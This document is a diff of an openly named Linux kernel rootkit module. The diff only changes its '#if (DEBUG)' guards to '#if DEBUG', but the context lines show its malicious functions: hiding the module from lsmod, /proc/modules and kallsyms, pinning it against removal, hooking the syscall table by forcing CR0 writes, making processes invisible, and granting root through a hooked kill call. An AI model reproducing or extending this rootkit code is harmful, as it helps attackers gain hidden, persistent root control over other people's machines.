@@ -57,7 +57,7 @@ static void hide_rootkit(void)
 	
 	if (is_hidden_proc)
 	{
-		#if (DEBUG)
+		#if DEBUG
 		{
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
 		}
@@ -67,7 +67,7 @@ static void hide_rootkit(void)
 
 	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;
 
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
 	}
@@ -83,7 +83,7 @@ static void show_rootkit(void)
 {
 	if (!is_hidden_proc)
 	{
-		#if (DEBUG)
+		#if DEBUG
 		{
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
 		}
@@ -91,7 +91,7 @@ static void show_rootkit(void)
 		return;
 	}
 	
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
 	}
@@ -110,7 +110,7 @@ static void protect_rootkit(void)
 	{
 		try_module_get(THIS_MODULE);
 		is_protected = 1;
-		#if (DEBUG)
+		#if DEBUG
 		{
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT ROOTKIT\n");
 		}
@@ -125,7 +125,7 @@ static void remove_rootkit(void)
 	{
 		module_put(THIS_MODULE);
 		is_protected = 0;
-		#if (DEBUG)
+		#if DEBUG
 		{
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT ROOTKIT\n");
 		}
@@ -161,7 +161,7 @@ static inline void write_cr0_forced(unsigned long val)
 /* PROTECT MEMORY */
 static inline void protect_memory(void)
 {
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT MEMORY\n");
 	}
@@ -172,7 +172,7 @@ static inline void protect_memory(void)
 /* UNPROTECT MEMORY */
 static inline void unprotect_memory(void)
 {
-	#if (DEBUG)
+	#if DEBUG
 	{
 		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT MEMORY\n");
 	}
@@ -308,14 +308,14 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 				return -ESRCH;
 
 			task->flags = task->flags ^ PF_INVISIBLE;
-			#if (DEBUG)
+			#if DEBUG
 			{
 				printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding/unhiding pid: %d \n", pid);
 			}
 			#endif
 			break;
 		case GET_ROOT:
-			#if (DEBUG)
+			#if DEBUG
 			{
 				printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ offering root shell!!\n");
 			}
@@ -324,7 +324,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 			set_root();
 			break;
 		case HIDE_ROOTKIT:
-			#if (DEBUG)
+			#if DEBUG
 			{
 				printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM\n");
 			}
@@ -334,7 +334,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 			hide_rootkit();
 			break;
 		case SHOW_ROOTKIT:
-			#if (DEBUG)
+			#if DEBUG
 			{
 				printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ showing LKM\n");
 			}
@@ -352,7 +352,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 /* INIT */
 static int __init rootkit_init(void)
 {
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM loaded \n");
 	}
@@ -364,7 +364,7 @@ static int __init rootkit_init(void)
 	if (!__sys_call_table)
 		return -1;
 
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table address: 0x%px \n", __sys_call_table);
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_getends64 address: 0x%px \n", hacked_getdents64);
@@ -392,7 +392,7 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
 	unprotect_memory();
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table setting to default\n");
 	}
@@ -403,7 +403,7 @@ static void __exit rootkit_exit(void)
 
 	protect_memory();
 
-	#if (DEBUG)
+	#if DEBUG
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM unloaded \n");
 	}
